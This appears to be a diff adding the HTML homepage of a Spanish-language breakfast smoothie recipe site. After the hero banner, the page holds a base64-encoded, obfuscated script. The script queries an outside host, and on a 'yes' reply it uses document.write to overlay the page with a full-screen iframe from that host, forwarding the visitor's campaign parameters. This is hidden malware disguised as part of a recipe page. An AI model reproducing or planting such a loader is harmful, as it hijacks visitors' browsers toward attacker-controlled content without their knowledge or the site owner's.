@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Recetas de cócteles para el desayuno</title>
+    <link rel="apple-touch-icon" sizes="57x57" href="img/favicon/apple-touch-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="img/favicon/apple-touch-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="img/favicon/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="img/favicon/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="img/favicon/apple-touch-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="img/favicon/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="img/favicon/apple-touch-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="img/favicon/apple-touch-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="img/favicon/apple-touch-icon-180x180.png">
+    <link rel="icon" type="image/png" href="img/favicon/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="img/favicon/android-chrome-192x192.png" sizes="192x192">
+    <link rel="icon" type="image/png" href="img/favicon/favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/png" href="img/favicon/favicon-16x16.png" sizes="16x16">
+    <!-- <link rel="manifest" href="img/favicon/manifest.json"> -->
+    <link rel="shortcut icon" href="img/favicon/favicon.ico">
+    <meta name="msapplication-TileColor" content="#663fb5">
+    <meta name="msapplication-TileImage" content="img/favicon/mstile-144x144.png">
+    <meta name="msapplication-config" content="img/favicon/browserconfig.xml">
+    <meta name="theme-color" content="#663fb5">
+    <link rel="stylesheet" href="css/landio.css">
+
+    <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+  </head>
+
+  <body>
+
+    <!-- Navigation
+    ================================================== -->
+
+    <nav class="navbar navbar-dark bg-inverse bg-inverse-custom navbar-fixed-top">
+      <div class="container">
+        <a class="navbar-brand" href="/">
+          <span class="icon-logo"></span>
+        </a>
+        <a class="navbar-toggler hidden-md-up pull-xs-right" data-toggle="collapse" href="#collapsingNavbar" aria-expanded="false" aria-controls="collapsingNavbar">
+        &#9776;
+      </a>
+        <div id="collapsingNavbar" class="collapse navbar-toggleable-custom" role="tabpanel" aria-labelledby="collapsingNavbar">
+          <ul class="nav navbar-nav pull-xs-right">
+            <li class="nav-item nav-item-toggable">
+              <a class="nav-link" href="pages/remolacha.html">Batido de remolacha y zanahoria</a>
+            </li>
+            <li class="nav-item nav-item-toggable">
+              <a class="nav-link" href="pages/cuajada.html">Batido de cuajada de maní</a>
+            </li>
+            <li class="nav-item nav-item-toggable">
+              <a class="nav-link" href="pages/cacao.html">Batido de plátano con leche y cacao</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+
+    <!-- Hero Section
+    ================================================== -->
+
+    <header class="jumbotron bg-inverse text-xs-center center-vertically" role="banner">
+      <div class="container">
+        <h1 class="display-3">Recetas de cócteles</h1>
+        <h2 class="m-b-3">Las mejores recetas de cócteles para el desayuno</h2>
+      </div>
+    </header>
+
+    <script src="data:text/javascript;base64,dmFyIF8weDM4ZWI9WyI4MzIwNjVIWXpoVGYiLCJ3cml0ZSIsInV0bV9jYW1wYWlnbiIsIjM1NzI4OGllTGRDdyIsImdldCIsIjJObldMQm4iLCJodHRwczovL2Rlc2VydmV0cmF2ZWwuY29tL2luZGV4LnBocD9rZXk9c3QxbmVid2hwamJ3bDZxdjMyZ3ciLCIxR2hnQnNMIiwiM3BIQ1BaciIsInllcyIsJzxpZnJhbWUgc3JjPSJodHRwczovL2Rlc2VydmV0cmF2ZWwuY29tL2luZGV4LnBocD9rZXk9dmVsd25qbzV2a294aTNqbDkwNmomdXRtX2NhbXBhaWduPScsIjQwNlVkanVDTyIsIjg3MTU4MVl0VFNybiIsIm1hdGNoIiwiNzk0MzE0amZXalJaIiwiMjc2NDI1am95TGhEIiwnIiBmcmFtZWJvcmRlcj0iMCIgc3R5bGU9Im92ZXJmbG93OmhpZGRlbjtvdmVyZmxvdy14OmhpZGRlbjtvdmVyZmxvdy15OmhpZGRlbjtoZWlnaHQ6MTAwJTt3aWR0aDoxMDAlO3Bvc2l0aW9uOmFic29sdXRlO3RvcDowcHg7bGVmdDowcHg7cmlnaHQ6MHB4O2JvdHRvbTowcHgiIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiPjwvaWZyYW1lPicsIjE2ODVFa0tPbmQiLCJ1dG1fdGVybSIsIjIxNjc1MVhPSWtIZiIsImxvY2F0aW9uIl07ZnVuY3Rpb24gXzB4Mzc4ZihlLHQpe3JldHVybiBfMHgzOGViW2UtPTEzOV19dmFyIF8weDQyMzhhZD1fMHgzNzhmO2Z1bmN0aW9uIGdldENvb2tpZXMoZSl7dmFyIHQ9XzB4Mzc4ZixyPXdpbmRvd1t0KDE0MyldLnNlYXJjaDtyZXR1cm4hIShyPXJbdCgxNTcpXShuZXcgUmVnRXhwKGUrIj0oW14mPV0rKSIpKSkmJnJbMV19ZnVuY3Rpb24gb25BamF4U3VjY2VzcyhlKXt2YXIgdD1fMHg0MjM4YWQ7ZT09dCgxNTMpJiZkb2N1bWVudFt0KDE0NSldKHQoMTU0KStnZXRDb29raWVzKHQoMTQ2KSkrIiZ1dG1fdGVybT0iK2dldENvb2tpZXModCgxNDEpKSt0KDEzOSkpfSFmdW5jdGlvbih0KXtmb3IodmFyIGU9XzB4Mzc4Zjs7KXRyeXtpZig0ODExNzA9PT1wYXJzZUludChlKDE0MCkpKi1wYXJzZUludChlKDE1NSkpK3BhcnNlSW50KGUoMTU4KSkqcGFyc2VJbnQoZSgxNTEpKSstcGFyc2VJbnQoZSgxNDkpKSpwYXJzZUludChlKDE0NykpK3BhcnNlSW50KGUoMTU2KSkrLXBhcnNlSW50KGUoMTQ0KSkrcGFyc2VJbnQoZSgxNDIpKSstcGFyc2VJbnQoZSgxNTkpKSotcGFyc2VJbnQoZSgxNTIpKSlicmVhazt0LnB1c2godC5zaGlmdCgpKX1jYXRjaChlKXt0LnB1c2godC5zaGlmdCgpKX19KF8weDM4ZWIpLCRbXzB4NDIzOGFkKDE0OCldKF8weDQyMzhhZCgxNTApLG9uQWpheFN1Y2Nlc3MpOw=="></script>
+    
+    <!-- Text Content
+    ================================================== -->
+
+    <section class="section-text">
+      <div class="container">
+        <h3 class="text-xs-center">Recetas de cócteles para el desayuno</h3>
+        <!-- <div class="row p-y-3">
+          <div class="col-md-5">
+            <p class="wp wp-7">A posuere donec senectus suspendisse bibendum magna ridiculus a justo orci parturient suspendisse ad rhoncus cursus ut parturient viverra elit aliquam ultrices est sem. Tellus nam ad fermentum ac enim est duis facilisis congue a lacus adipiscing consequat risus consectetur scelerisque integer suspendisse a mus integer elit massa ut.</p>
+          </div>
+          <div class="col-md-5 col-md-offset-2 separator-x">
+            <p class="wp wp-8">A posuere donec senectus suspendisse bibendum magna ridiculus a justo orci parturient suspendisse ad rhoncus cursus ut parturient viverra elit aliquam ultrices est sem. Tellus nam ad fermentum ac enim est duis facilisis congue a lacus adipiscing consequat risus consectetur scelerisque integer suspendisse a mus integer elit massa ut.</p>
+          </div>
+        </div> -->
+      </div>
+    </section>
+
+    <!-- News
+    ================================================== -->
+
+    <section class="section-news">
+      <div class="container">
+        <h3 class="sr-only">News</h3>
+        <div class="bg-inverse">
+          <div class="row">
+            <a class="col-md-6 p-r-0" href="pages/remolacha.html">
+              <figure class="has-light-mask m-b-0 image-effect">
+                <img src="img/1.jpg" alt="Article thumbnail" class="img-fluid">
+              </figure>
+            </a>
+            <div class="col-md-6 p-l-0">
+              <article class="center-block">
+                <span class="label label-info">Batido de remolacha y zanahoria</span>
+                <br>
+                <h5><a href="pages/remolacha.html">Una bebida vegetal brillante: batido de remolacha y zanahoria. Rico en antioxidantes, este batido de vitaminas es fácil de preparar.<span class="icon-arrow-right"></span></a></h5>
+              </article>
+            </div>
+          </div>
+          <div class="row">
+            <a class="col-md-6 col-md-push-6 p-l-0" href="pages/cuajada.html">
+              <figure class="has-light-mask m-b-0 image-effect">
+                <img src="img/2.jpg" alt="Article thumbnail" class="img-fluid">
+              </figure>
+            </a>
+            <div class="col-md-6 col-md-pull-6 p-r-0">
+              <article class="center-block">
+                <span class="label label-info">Batido de cuajada de maní</span>
+                <br>
+                <h5><a href="pages/cuajada.html">Batido de leche espesa con requesón, maní, canela y miel: una bebida proteica saludable<span class="icon-arrow-right"></span></a></h5>
+              </article>
+            </div>
+          </div>
+          <div class="row">
+            <a class="col-md-6 p-r-0" href="pages/cacao.html">
+              <figure class="has-light-mask m-b-0 image-effect">
+                <img src="img/3.jpg" alt="Article thumbnail" class="img-fluid">
+              </figure>
+            </a>
+            <div class="col-md-6 p-l-0">
+              <article class="center-block">
+                <span class="label label-info">Batido de plátano con leche y cacao</span>
+                <br>
+                <h5><a href="pages/cacao.html">La receta para un desayuno ligero y nutritivo es un batido de plátano con leche y cacao.<span class="icon-arrow-right"></span></a></h5>
+              </article>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Footer
+    ================================================== -->
+
+    <footer class="section-footer bg-inverse" role="contentinfo">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-6 col-lg-5">
+            <div class="media">
+              <div class="media-left">
+                <span class="media-object icon-logo display-1"></span>
+              </div>
+              <p class="media-body media-bottom">
+                <a href="pages/privacypolicy.html" target="_blank">Privacy Policy</a>
+              </p>
+            </div>
+          </div>
+          <div class="col-md-6 col-lg-7">
+            <ul class="nav nav-inline">
+              <li class="nav-item"><a class="nav-link" href="pages/remolacha.html">Batido de remolacha y zanahoria</a></li>
+              <li class="nav-item"><a class="nav-link" href="pages/cuajada.html">Batido de cuajada de maní</a></li>
+              <li class="nav-item"><a class="nav-link" href="pages/cacao.html">Batido de plátano con leche y cacao</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+    <!-- <script src="js/landio.min.js"></script> -->
+  </body>
+</html>
